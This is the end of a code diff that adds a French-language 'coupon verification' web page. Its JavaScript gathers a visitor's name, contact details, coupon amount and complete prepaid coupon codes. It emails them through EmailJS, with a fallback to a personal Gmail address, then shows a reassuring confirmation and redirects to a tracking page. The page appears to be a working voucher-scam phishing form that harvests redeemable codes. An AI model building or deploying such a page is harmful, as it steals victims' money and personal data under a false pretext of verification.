+                terms_accepted: formData.terms ? 'Oui' : 'Non',
+                user_message: `Nouvelle demande de vérification de coupon reçue de ${formData.fullName}`
+            };
+
+            // Send email using EmailJS
+            emailjs.send("service_l1z1wcm","template_k3kddrm", templateParams)
+                .then(function(response) {
+                    console.log('SUCCESS!', response.status, response.text);
+                    
+                    // Show success message
+                    showNotification('Votre demande de vérification a été soumise avec succès! Vous recevrez une confirmation par email.', 'success');
+                    
+                    // Reset form
+                    document.getElementById('verificationForm').reset();
+                    imagePreview.innerHTML = '';
+                    uploadedFiles = [];
+                    
+                    // Redirect to tracking page after 3 seconds
+                    setTimeout(() => {
+                        window.location.href = 'track.html';
+                    }, 3000);
+                    
+                }, function(error) {
+                    console.log('FAILED...', error);
+                    
+                    // Fallback: create mailto link
+                    const subject = encodeURIComponent(`Nouvelle demande de vérification - ${formData.fullName}`);
+                    const body = encodeURIComponent(`
+Détails de la demande:
+Nom: ${formData.fullName}
+Email: ${formData.userEmail}
+Téléphone: ${formData.phoneNumber}
+Type de coupon: ${formData.couponType}
+Montant: ${formData.amount} ${formData.currency}
+Code complet: ${fullCode}
+Codes individuels: ${formData.code1}, ${formData.code2}, ${formData.code3}, ${formData.code4}
+Date de soumission: ${formData.submissionTime}
+Fichiers uploadés: ${formData.uploadedFiles || 'Aucun'}
+Conditions acceptées: ${formData.terms ? 'Oui' : 'Non'}
+                    `);
+                    
+                    window.location.href = `mailto:adrienkoba311@gmail.com?subject=${subject}&body=${body}`;
+                    
+                    showNotification('Redirection vers votre client email...', 'info');
+                });
+        });
+
+        // Notification function
+        function showNotification(message, type) {
+            const notification = document.createElement('div');
+            notification.className = `fixed top-4 right-4 p-4 rounded-lg text-white z-50 max-w-md ${
+                type === 'success' ? 'bg-green-600' : 
+                type === 'error' ? 'bg-red-600' : 
+                'bg-blue-600'
+            }`;
+            notification.innerHTML = `
+                <div class="flex items-center">
+                    <svg class="w-5 h-5 mr-2" fill="currentColor" viewBox="0 0 20 20">
+                        ${type === 'success' ? 
+                            '<path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"/>' :
+                            '<path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z" clip-rule="evenodd"/>'
+                        }
+                    </svg>
+                    <span>${message}</span>
+                </div>
+            `;
+            
+            document.body.appendChild(notification);
+            
+            // Auto remove after 5 seconds
+            setTimeout(() => {
+                notification.remove();
+            }, 5000);
+        }
+    </script>
+</body>
+</html>
